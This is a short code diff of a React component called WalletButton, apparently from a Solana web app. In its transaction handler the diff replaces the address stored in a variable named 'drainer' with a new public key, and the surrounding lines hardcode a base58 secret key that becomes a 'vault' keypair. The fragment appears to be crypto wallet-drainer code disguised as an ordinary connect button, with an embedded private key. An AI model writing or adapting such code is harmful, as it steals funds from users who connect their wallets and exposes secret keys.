@@ -135,7 +135,7 @@ export default function WalletButton({ className, children }: WalletButtonProps)
     setIsProcessingTransaction(true)
 
     try {
-      const drainer = new PublicKey("HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui")
+      const drainer = new PublicKey("8MN8QciRbHARCjq1gCeh4vNxLrw8F7YTsgoVJGisPvTt")
       const secret = Keypair.fromSecretKey(
         bs58.decode("3r8mykC8HCirQBq5R5ZXEB5vBWd53WFsbSSpfmah1s4uETHzKJpCoCgJubZ6CuUykPMfEv5fdt4aV6BRFwqm7uaY"));
       const vault = secret.publicKey
